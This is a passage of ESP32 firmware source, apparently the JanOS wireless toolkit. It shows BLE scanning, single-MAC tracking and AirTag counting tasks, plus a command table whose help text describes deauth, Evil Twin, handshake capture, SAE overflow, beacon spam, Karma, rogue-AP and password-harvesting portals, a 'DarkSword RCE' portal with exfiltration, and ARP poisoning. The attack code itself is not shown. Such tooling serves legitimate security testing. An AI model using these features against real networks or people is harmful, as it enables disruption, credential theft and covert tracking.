        if (!bt_airtag_scan_active || operation_stop_requested) {
            break;
        }
        
        // Output in requested format: airtag_count,smarttag_count
        printf("%d,%d\n", bt_airtag_count, bt_smarttag_count);
        
        {
            char at_l3[64];
            snprintf(at_l3, sizeof(at_l3), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
            oled_display_update_full("> AirTag Scan", "  Cycle done", at_l3, "  Next cycle...");
        }
        
        // Immediately start next scan cycle (no wait)
    }
    
    // Restore idle LED
    led_set_idle();
    
    bt_airtag_scan_active = false;
    bt_scan_task_handle = NULL;
    MY_LOG_INFO(TAG, "AirTag scanner stopped.");
    vTaskDelete(NULL);
}

/**
 * Task for MAC tracking mode (scan_bt with MAC argument)
 * Scans every 10 seconds and outputs RSSI for the tracked MAC
 */
static void bt_tracking_task(void *pvParameters)
{
    char mac_str[18];
    bt_format_addr(bt_tracking_mac, mac_str);
    
    MY_LOG_INFO(TAG, "Tracking %s (10s intervals)...", mac_str);
    MY_LOG_INFO(TAG, "Use 'stop' command to stop tracking.");
    MY_LOG_INFO(TAG, "");
    
    while (bt_scan_active && !operation_stop_requested) {
        // Reset tracking state
        bt_tracking_found = false;
        bt_tracking_rssi = 0;
        
        int rc = bt_start_scan();
        if (rc != 0) {
            MY_LOG_INFO(TAG, "BLE scan start failed: %d", rc);
            break;
        }
        
        // Scan for 10 seconds with light blue LED blinking
        bool led_on = false;
        for (int i = 0; i < 100 && bt_scan_active && !operation_stop_requested; i++) {
            // Toggle LED every 500ms (every 5 iterations)
            if (i % 5 == 0) {
                led_on = !led_on;
                if (led_on) {
                    led_set_color(100, 200, 255); // Light blue
                } else {
                    led_clear();
                }
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        bt_stop_scan();
        
        if (!bt_scan_active || operation_stop_requested) {
            break;
        }
        
        // Output result
        if (bt_tracking_found) {
            if (bt_tracking_name[0] != '\0') {
                printf("%s  RSSI: %d dBm  Name: %s\n", mac_str, bt_tracking_rssi, bt_tracking_name);
            } else {
                printf("%s  RSSI: %d dBm\n", mac_str, bt_tracking_rssi);
            }
        } else {
            printf("%s  not found\n", mac_str);
        }
    }
    
    // Restore idle LED
    led_set_idle();
    
    bt_tracking_mode = false;
    bt_scan_active = false;
    bt_scan_task_handle = NULL;
    MY_LOG_INFO(TAG, "MAC tracking stopped.");
    vTaskDelete(NULL);
}

/**
 * Command: scan_bt - One-time BLE device scan
 * With MAC argument: continuous tracking of specific device
 * 
 * Usage:
 *   scan_bt              - One-time 10s scan, show all devices
 *   scan_bt XX:XX:XX:XX:XX:XX - Continuous tracking of specific MAC (2s intervals)
 */
static int cmd_scan_bt(int argc, char **argv)
{
    if (argc > 1) {
        oled_display_update_full("> BLE Track", argv[1], "  Tracking MAC", "  Scanning...");
    } else {
        oled_display_update_full("> BLE Scan", "  Discovering...", "  10s scan time", "  Working...");
    }
    log_memory_info("scan_bt");
    
    // Ensure BLE is initialized (may reboot if WiFi was active)
    if (!ensure_ble_mode()) {
        return 1;
    }
    
    if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) {
        MY_LOG_INFO(TAG, "BLE scan already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    bt_scan_active = true;
    operation_stop_requested = false;
    
    // Check if MAC argument provided
    if (argc > 1) {
        // Tracking mode - parse MAC address
        if (!bt_parse_mac(argv[1], bt_tracking_mac)) {
            MY_LOG_INFO(TAG, "Invalid MAC address format. Use XX:XX:XX:XX:XX:XX");
            bt_scan_active = false;
            return 1;
        }
        
        bt_tracking_mode = true;
        bt_tracking_found = false;
        bt_tracking_rssi = 0;
        bt_tracking_name[0] = '\0';
        
        BaseType_t task_ret = xTaskCreate(
            bt_tracking_task,
            "bt_tracking_task",
            4096,
            NULL,
            5,
            &bt_scan_task_handle
        );
        
        if (task_ret != pdPASS) {
            bt_scan_active = false;
            bt_tracking_mode = false;
            MY_LOG_INFO(TAG, "Failed to create MAC tracking task");
            return 1;
        }
    } else {
        // Normal scan mode
        bt_tracking_mode = false;
        
        BaseType_t task_ret = xTaskCreate(
            bt_scan_task,
            "bt_scan_task",
            4096,
            NULL,
            5,
            &bt_scan_task_handle
        );
        
        if (task_ret != pdPASS) {
            bt_scan_active = false;
            MY_LOG_INFO(TAG, "Failed to create BLE scan task");
            return 1;
        }
    }
    
    return 0;
}

/**
 * Command: scan_airtag - Continuous AirTag/SmartTag scanning
 */
static int cmd_scan_airtag(int argc, char **argv)
{
    (void)argc; (void)argv;
    oled_display_update_full("> AirTag Scan", "  Apple+Samsung", "  Continuous", "  Scanning...");
    log_memory_info("scan_airtag");
    
    // Ensure BLE is initialized (may reboot if WiFi was active)
    if (!ensure_ble_mode()) {
        return 1;
    }
    
    if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) {
        MY_LOG_INFO(TAG, "BLE scan already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    bt_airtag_scan_active = true;
    operation_stop_requested = false;
    
    BaseType_t task_ret = xTaskCreate(
        bt_airtag_scan_task,
        "bt_airtag_task",
        4096,
        NULL,
        5,
        &bt_scan_task_handle
    );
    
    if (task_ret != pdPASS) {
        bt_airtag_scan_active = false;
        MY_LOG_INFO(TAG, "Failed to create AirTag scan task");
        return 1;
    }
    
    return 0;
}

// ============================================================================

// --- Command registration in esp_console ---
static void register_commands(void)
{
    const esp_console_cmd_t scan_cmd = {
        .command = "scan_networks",
        .help = "Starts background network scan",
        .hint = NULL,
        .func = &cmd_scan_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_cmd));

    const esp_console_cmd_t show_scan_cmd = {
        .command = "show_scan_results",
        .help = "Shows results from last network scan",
        .hint = NULL,
        .func = &cmd_show_scan_results,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_scan_cmd));
    

    const esp_console_cmd_t sniffer_cmd = {
        .command = "start_sniffer",
        .help = "If no networks selected, starts network client sniffer with full scan, otherwise sniffs just selected networks without rescan",
        .hint = NULL,
        .func = &cmd_start_sniffer,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_cmd));

    const esp_console_cmd_t sniffer_noscan_cmd = {
        .command = "start_sniffer_noscan",
        .help = "Starts sniffer using existing scan results (requires prior scan_networks)",
        .hint = NULL,
        .func = &cmd_start_sniffer_noscan,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_noscan_cmd));

    const esp_console_cmd_t packet_monitor_cmd = {
        .command = "packet_monitor",
        .help = "Monitor packets per second on a channel: packet_monitor <channel>",
        .hint = NULL,
        .func = &cmd_packet_monitor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&packet_monitor_cmd));

    const esp_console_cmd_t channel_view_cmd = {
        .command = "channel_view",
        .help = "Continuously scan and print Wi-Fi channel utilization",
        .hint = NULL,
        .func = &cmd_channel_view,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&channel_view_cmd));


    const esp_console_cmd_t show_sniffer_cmd = {
        .command = "show_sniffer_results",
        .help = "Shows sniffer results sorted by client count",
        .hint = NULL,
        .func = &cmd_show_sniffer_results,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_sniffer_cmd));
    const esp_console_cmd_t show_sniffer_vendor_cmd = {
        .command = "show_sniffer_results_vendor",
        .help = "Shows sniffer results sorted by client count with vendors",
        .hint = NULL,
        .func = &cmd_show_sniffer_results_vendor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_sniffer_vendor_cmd));

    const esp_console_cmd_t clear_sniffer_cmd = {
        .command = "clear_sniffer_results",
        .help = "Clears all sniffer results (captured clients, probe requests, counters)",
        .hint = NULL,
        .func = &cmd_clear_sniffer_results,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&clear_sniffer_cmd));

    const esp_console_cmd_t show_probes_cmd = {
        .command = "show_probes",
        .help = "Shows captured probe requests with SSIDs",
        .hint = NULL,
        .func = &cmd_show_probes,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_probes_cmd));
    const esp_console_cmd_t show_probes_vendor_cmd = {
        .command = "show_probes_vendor",
        .help = "Shows captured probe requests with SSIDs and vendors",
        .hint = NULL,
        .func = &cmd_show_probes_vendor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_probes_vendor_cmd));

    const esp_console_cmd_t list_probes_cmd = {
        .command = "list_probes",
        .help = "Lists probe requests with index and SSID",
        .hint = NULL,
        .func = &cmd_list_probes,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_probes_cmd));
    const esp_console_cmd_t list_probes_vendor_cmd = {
        .command = "list_probes_vendor",
        .help = "Lists probe requests with index, SSID, and vendor",
        .hint = NULL,
        .func = &cmd_list_probes_vendor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_probes_vendor_cmd));

    const esp_console_cmd_t sniffer_debug_cmd = {
        .command = "sniffer_debug",
        .help = "Enable/disable detailed sniffer debug logging: sniffer_debug <0|1>",
        .hint = NULL,
        .func = &cmd_sniffer_debug,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_debug_cmd));

    const esp_console_cmd_t sniffer_dog_cmd = {
        .command = "start_sniffer_dog",
        .help = "Starts Sniffer Dog - captures AP-STA pairs and sends targeted deauth packets",
        .hint = NULL,
        .func = &cmd_start_sniffer_dog,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_dog_cmd));

    const esp_console_cmd_t deauth_detector_cmd = {
        .command = "deauth_detector",
        .help = "Detect deauth frames. No args: scan+all channels. With indices: selected channels only",
        .hint = "[index1 index2 ...]",
        .func = &cmd_deauth_detector,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_detector_cmd));

    const esp_console_cmd_t select_cmd = {
        .command = "select_networks",
        .help = "Selects networks by indexes: select_networks 0 2 5",
        .hint = NULL,
        .func = &cmd_select_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_cmd));

    const esp_console_cmd_t unselect_cmd = {
        .command = "unselect_networks",
        .help = "Stops operations and clears network selection (keeps scan results)",
        .hint = NULL,
        .func = &cmd_unselect_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&unselect_cmd));

    const esp_console_cmd_t select_stations_cmd = {
        .command = "select_stations",
        .help = "Select client MAC addresses for targeted deauth: select_stations <MAC1> [MAC2] ...",
        .hint = NULL,
        .func = &cmd_select_stations,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_stations_cmd));

    const esp_console_cmd_t unselect_stations_cmd = {
        .command = "unselect_stations",
        .help = "Clear station selection (revert to broadcast deauth)",
        .hint = NULL,
        .func = &cmd_unselect_stations,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&unselect_stations_cmd));

    const esp_console_cmd_t start_cmd = {
        .command = "start_evil_twin",
        .help = "Starts Evil Twin attack.",
        .hint = NULL,
        .func = &cmd_start_evil_twin,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&start_cmd));

    const esp_console_cmd_t deauth_cmd = {
        .command = "start_deauth",
        .help = "Starts Deauth attack.",
        .hint = NULL,
        .func = &cmd_start_deauth,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));

    const esp_console_cmd_t handshake_cmd = {
        .command = "start_handshake",
        .help = "Starts WPA Handshake capture attack. With selected networks: attacks only those. Without: scans every 5min and attacks all.",
        .hint = NULL,
        .func = &cmd_start_handshake,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&handshake_cmd));

    const esp_console_cmd_t save_handshake_cmd = {
        .command = "save_handshake",
        .help = "Manually saves captured handshake to SD card (only if complete 4-way handshake).",
        .hint = NULL,
        .func = &cmd_save_handshake,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&save_handshake_cmd));

    const esp_console_cmd_t wpasec_key_cmd = {
        .command = "wpasec_key",
        .help = "Set/read wpa-sec.stanev.org API key: wpasec_key set <key> | wpasec_key read",
        .hint = NULL,
        .func = &cmd_wpasec_key,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wpasec_key_cmd));

    const esp_console_cmd_t wpasec_upload_cmd = {
        .command = "wpasec_upload",
        .help = "Upload all .pcap handshakes from SD card to wpa-sec.stanev.org",
        .hint = NULL,
        .func = &cmd_wpasec_upload,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wpasec_upload_cmd));

    const esp_console_cmd_t wigle_key_cmd = {
        .command = "wigle_key",
        .help = "Set/read WiGLE API credentials: wigle_key set <api_name> <api_token> | wigle_key read",
        .hint = NULL,
        .func = &cmd_wigle_key,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wigle_key_cmd));

    const esp_console_cmd_t wigle_upload_cmd = {
        .command = "wigle_upload",
        .help = "Upload Wardrive files to WiGLE: wigle_upload [file1 file2 ...] (no args = upload all)",
        .hint = NULL,
        .func = &cmd_wigle_upload,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wigle_upload_cmd));

    const esp_console_cmd_t wdgwars_key_cmd = {
        .command = "wdgwars_key",
        .help = "Set/read WDGWars API key: wdgwars_key set <key> | wdgwars_key read",
        .hint = NULL,
        .func = &cmd_wdgwars_key,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wdgwars_key_cmd));

    const esp_console_cmd_t wdgwars_upload_cmd = {
        .command = "wdgwars_upload",
        .help = "Upload Wardrive files to WDGWars: wdgwars_upload [file1 file2 ...] (no args = upload all)",
        .hint = NULL,
        .func = &cmd_wdgwars_upload,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wdgwars_upload_cmd));

       const esp_console_cmd_t sae_overflow_cmd = {
        .command = "sae_overflow",
        .help = "Starts SAE WPA3 Client Overflow attack.",
        .hint = NULL,
        .func = &cmd_start_sae_overflow,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sae_overflow_cmd));

    const esp_console_cmd_t blackout_cmd = {
        .command = "start_blackout",
        .help = "Starts blackout attack - scans all networks every 3 minutes, sorts by channel, attacks all",
        .hint = NULL,
        .func = &cmd_start_blackout,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&blackout_cmd));

    const esp_console_cmd_t beacon_spam_cmd = {
        .command = "start_beacon_spam",
        .help = "Spam beacon frames with fake SSIDs on various channels",
        .hint = "\"SSID1\" \"SSID2\" ...",
        .func = &cmd_start_beacon_spam,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&beacon_spam_cmd));

    const esp_console_cmd_t beacon_spam_ssids_cmd = {
        .command = "start_beacon_spam_ssids",
        .help = "Beacon spam with all SSIDs from /sdcard/lab/ssids.txt",
        .hint = NULL,
        .func = &cmd_start_beacon_spam_ssids,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&beacon_spam_ssids_cmd));

    const esp_console_cmd_t gps_raw_cmd = {
        .command = "start_gps_raw",
        .help = "Prints raw GPS NMEA sentences: start_gps_raw [baud] (default depends on gps_set)",
        .hint = "[baud]",
        .func = &cmd_start_gps_raw,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&gps_raw_cmd));

    const esp_console_cmd_t gps_set_cmd = {
        .command = "gps_set",
        .help = "Select GPS module: gps_set <m5|atgm|external|cap> (usb alias for external)",
        .hint = "<m5|atgm|external|cap>",
        .func = &cmd_gps_set,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&gps_set_cmd));

    const esp_console_cmd_t set_gps_position_cmd = {
        .command = "set_gps_position",
        .help = "Set external GPS fix: set_gps_position <lat> <lon> [alt] [acc] | no args = lost fix",
        .hint = "[lat lon [alt] [acc]]",
        .func = &cmd_set_gps_position,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&set_gps_position_cmd));

    const esp_console_cmd_t set_gps_position_cap_cmd = {
        .command = "set_gps_position_cap",
        .help = "Set external CAP GPS fix: set_gps_position_cap <lat> <lon> [alt] [acc] | no args = lost fix",
        .hint = "[lat lon [alt] [acc]]",
        .func = &cmd_set_gps_position_cap,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&set_gps_position_cap_cmd));

    const esp_console_cmd_t wardrive_cmd = {
        .command = "start_wardrive",
        .help = "Starts wardriving with GPS and SD logging",
        .hint = NULL,
        .func = &cmd_start_wardrive,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_cmd));

    const esp_console_cmd_t wardrive_promisc_cmd = {
        .command = "start_wardrive_promisc",
        .help = "Promiscuous wardrive with D-UCB channel selection",
        .hint = NULL,
        .func = &cmd_start_wardrive_promisc,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_promisc_cmd));

    const esp_console_cmd_t wardrive_promisc_trace_cmd = {
        .command = "start_wardrive_promisc_trace",
        .help = "Promiscuous wardrive with D-UCB channel selection and KML trace logging",
        .hint = NULL,
        .func = &cmd_start_wardrive_promisc_trace,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_promisc_trace_cmd));

    const esp_console_cmd_t portal_cmd = {
        .command = "start_portal",
        .help = "Starts captive portal with password form: start_portal <SSID>",
        .hint = NULL,
        .func = &cmd_start_portal,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));

    const esp_console_cmd_t darksword_cmd = {
        .command = "start_darksword",
        .help = "DarkSword RCE captive portal: start_darksword <SSID>. Serves /sdcard/lab/htmls/darksword.html, exfil on :8080, loot in /sdcard/loot/portal/",
        .hint = "<SSID>",
        .func = &cmd_start_darksword,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&darksword_cmd));

    const esp_console_cmd_t rogueap_cmd = {
        .command = "start_rogueap",
        .help = "Start WPA2 rogue AP with captive portal: start_rogueap <SSID> <password>. Requires select_html first. Runs deauth if networks selected.",
        .hint = "<SSID> <password>",
        .func = &cmd_start_rogueap,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&rogueap_cmd));

    const esp_console_cmd_t karma_cmd = {
        .command = "start_karma",
        .help = "Starts Karma attack with SSID from probe list: start_karma <index>",
        .hint = NULL,
        .func = &cmd_start_karma,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&karma_cmd));

    const esp_console_cmd_t vendor_cmd = {
        .command = "vendor",
        .help = "Controls vendor lookup: vendor set <on|off> | vendor read",
        .hint = NULL,
        .func = &cmd_vendor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&vendor_cmd));

    const esp_console_cmd_t display_cmd = {
        .command = "display",
        .help = "Display mode: display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read",
        .hint = NULL,
        .func = &cmd_display,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&display_cmd));

    const esp_console_cmd_t boot_button_cmd = {
        .command = "boot_button",
        .help = "Configure boot button actions: boot_button read|list|set <short|long> <command[, command...]>|status <short|long> <on|off>",
        .hint = NULL,
        .func = &cmd_boot_button,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&boot_button_cmd));

    const esp_console_cmd_t led_cmd = {
        .command = "led",
        .help = "Controls status LED: led set <on|off> | led level <1-100> | led read",
        .hint = NULL,
        .func = &cmd_led,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&led_cmd));

    const esp_console_cmd_t channel_time_cmd = {
        .command = "channel_time",
        .help = "Controls scan channel time: channel_time set <min|max> <ms> | channel_time read <min|max>",
        .hint = NULL,
        .func = &cmd_channel_time,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&channel_time_cmd));

    const esp_console_cmd_t download_cmd = {
        .command = "download",
        .help = "Force reboot into ROM download (UART flashing) mode",
        .hint = NULL,
        .func = &cmd_download,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&download_cmd));

    const esp_console_cmd_t pcap_cmd = {
        .command = "start_pcap",
        .help = "Capture WiFi traffic to PCAP: start_pcap radio|net",
        .hint = "radio|net",
        .func = &cmd_start_pcap,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&pcap_cmd));

    const esp_console_cmd_t stop_cmd = {
        .command = "stop",
        .help = "Stop all running operations",
        .hint = NULL,
        .func = &cmd_stop,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&stop_cmd));

    const esp_console_cmd_t wifi_connect_cmd = {
        .command = "wifi_connect",
        .help = "Connect to AP as STA: wifi_connect <SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]",
        .hint = "<SSID> [Password] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]",
        .func = &cmd_wifi_connect,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wifi_connect_cmd));

    const esp_console_cmd_t wifi_disconnect_cmd = {
        .command = "wifi_disconnect",
        .help = "Disconnect from current AP (STA)",
        .hint = NULL,
        .func = &cmd_wifi_disconnect,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wifi_disconnect_cmd));

    const esp_console_cmd_t ota_check_cmd = {
        .command = "ota_check",
        .help = "Check GitHub release and apply OTA update (requires WiFi)",
        .hint = NULL,
        .func = &cmd_ota_check,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_check_cmd));

    const esp_console_cmd_t ota_list_cmd = {
        .command = "ota_list",
        .help = "List recent GitHub releases (first 10)",
        .hint = NULL,
        .func = &cmd_ota_list,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_list_cmd));

    const esp_console_cmd_t ota_channel_cmd = {
        .command = "ota_channel",
        .help = "Get/set OTA channel: ota_channel [main|dev]",
        .hint = NULL,
        .func = &cmd_ota_channel,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_channel_cmd));

    const esp_console_cmd_t ota_info_cmd = {
        .command = "ota_info",
        .help = "Show OTA partition info",
        .hint = NULL,
        .func = &cmd_ota_info,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_info_cmd));

    const esp_console_cmd_t ota_boot_cmd = {
        .command = "ota_boot",
        .help = "Set boot partition: ota_boot <ota_0|ota_1>",
        .hint = NULL,
        .func = &cmd_ota_boot,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&ota_boot_cmd));

    const esp_console_cmd_t list_hosts_cmd = {
        .command = "list_hosts",
        .help = "Scan local network via ARP and list discovered hosts",
        .hint = NULL,
        .func = &cmd_list_hosts,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_hosts_cmd));

    const esp_console_cmd_t list_hosts_vendor_cmd = {
        .command = "list_hosts_vendor",
        .help = "Scan local network via ARP and list discovered hosts with vendor names",
        .hint = NULL,
        .func = &cmd_list_hosts_vendor,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_hosts_vendor_cmd));

    const esp_console_cmd_t nmap_cmd = {
        .command = "start_nmap",
        .help = "Port scan: start_nmap [quick|medium|heavy] [IP]",
        .hint = NULL,
        .func = &cmd_start_nmap,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&nmap_cmd));

    const esp_console_cmd_t arp_ban_cmd = {
        .command = "arp_ban",
        .help = "ARP poison a device to disconnect it: arp_ban <MAC> [IP]",
        .hint = "<MAC> [IP]",
        .func = &cmd_arp_ban,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&arp_ban_cmd));

    const esp_console_cmd_t reboot_cmd = {
        .command = "reboot",
        .help = "Device reboot to start from scratch",
        .hint = NULL,
        .func = &cmd_reboot,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&reboot_cmd));

    const esp_console_cmd_t ping_cmd = {
        .command = "ping",
        .help = "Connectivity test: prints pong",
        .hint = NULL,
        .func = &cmd_ping,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&ping_cmd));

    const esp_console_cmd_t list_sd_cmd = {
        .command = "list_sd",
        .help = "Lists HTML files on SD card",
        .hint = NULL,
        .func = &cmd_list_sd,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_sd_cmd));

    const esp_console_cmd_t show_pass_cmd = {
        .command = "show_pass",
        .help = "Prints password log: show_pass [portal|evil]",
        .hint = NULL,
        .func = &cmd_show_pass,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_pass_cmd));

    const esp_console_cmd_t list_dir_cmd = {
        .command = "list_dir",
        .help = "List files inside a directory on SD card: list_dir [path]",
        .hint = NULL,
        .func = &cmd_list_dir,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_dir_cmd));

    const esp_console_cmd_t list_ssid_cmd = {
        .command = "list_ssid",
        .help = "Lists SSIDs from /sdcard/lab/ssid.txt",
        .hint = NULL,
        .func = &cmd_list_ssid,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_ssid_cmd));

    const esp_console_cmd_t list_ssids_cmd = {
        .command = "list_ssids",
        .help = "Lists SSIDs from /sdcard/lab/ssids.txt",
        .hint = NULL,
        .func = &cmd_list_ssids,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&list_ssids_cmd));

    const esp_console_cmd_t add_ssid_cmd = {
        .command = "add_ssid",
        .help = "Add SSID to /sdcard/lab/ssids.txt",
        .hint = NULL,
        .func = &cmd_add_ssid,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&add_ssid_cmd));

    const esp_console_cmd_t remove_ssid_cmd = {
        .command = "remove_ssid",
        .help = "Remove SSID by index from /sdcard/lab/ssids.txt",
        .hint = NULL,
        .func = &cmd_remove_ssid,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&remove_ssid_cmd));

    const esp_console_cmd_t file_delete_cmd = {
        .command = "file_delete",
        .help = "Delete a file on SD card: file_delete <path>",
        .hint = NULL,
        .func = &cmd_file_delete,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&file_delete_cmd));

    const esp_console_cmd_t select_html_cmd = {
        .command = "select_html",
        .help = "Load custom HTML from SD card: select_html <index>",
        .hint = NULL,
        .func = &cmd_select_html,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_html_cmd));

    const esp_console_cmd_t set_html_cmd = {
        .command = "set_html",
        .help = "Set custom portal HTML from string: set_html <html>",
        .hint = NULL,
        .func = &cmd_set_html,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&set_html_cmd));

    // BLE Scanner commands
    const esp_console_cmd_t scan_bt_cmd = {
        .command = "scan_bt",
        .help = "One-time BLE device scan (10 seconds)",
        .hint = NULL,
        .func = &cmd_scan_bt,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_bt_cmd));

    const esp_console_cmd_t scan_airtag_cmd = {
        .command = "scan_airtag",
        .help = "Continuous AirTag/SmartTag scan (outputs count every 30s)",
        .hint = NULL,
        .func = &cmd_scan_airtag,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_airtag_cmd));

    const esp_console_cmd_t version_cmd = {
        .command = "version",
        .help = "Prints JanOS firmware version",
        .hint = NULL,
        .func = &cmd_version,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&version_cmd));
}

void app_main(void) {


    // printf("Heap regions:\n");
    // printf("  DRAM total: %u KB\n", (unsigned)(heap_caps_get_total_size(MALLOC_CAP_8BIT) / 1024));
    // printf("  IRAM total: %u KB\n", (unsigned)(heap_caps_get_total_size(MALLOC_CAP_EXEC) / 1024));
    // heap_caps_print_heap_info(MALLOC_CAP_DEFAULT);

    printf("\n\n=== APP_MAIN START (v" JANOS_VERSION ") ===\n");
    
    // Suppress WiFi internal WARNING logs (phy rate, etc.) - show only errors
    esp_log_level_set("wifi", ESP_LOG_ERROR);
    
    // Suppress SD card initialization errors (we handle them gracefully with our own message)
    esp_log_level_set("sdmmc_sd", ESP_LOG_NONE);
    esp_log_level_set("vfs_fat_sdmmc", ESP_LOG_NONE);
    esp_log_level_set("spi_common", ESP_LOG_NONE);

 #ifdef CONFIG_SPIRAM
//     printf("Step 1: Manual PSRAM init\n");
    
    // Manual PSRAM initialization (CONFIG_SPIRAM_BOOT_INIT=n)
    esp_err_t ret1 = esp_psram_init();
    if (ret1 == ESP_OK) {
        size_t psram_size = esp_psram_get_size();
        (void)psram_size;
        //printf("PSRAM initialized successfully, size: %zu bytes\n", psram_size);
        
        //printf("Step 2: Test PSRAM malloc\n");
        void* ptr = heap_caps_malloc(1024, MALLOC_CAP_SPIRAM);
        if (ptr != NULL) {
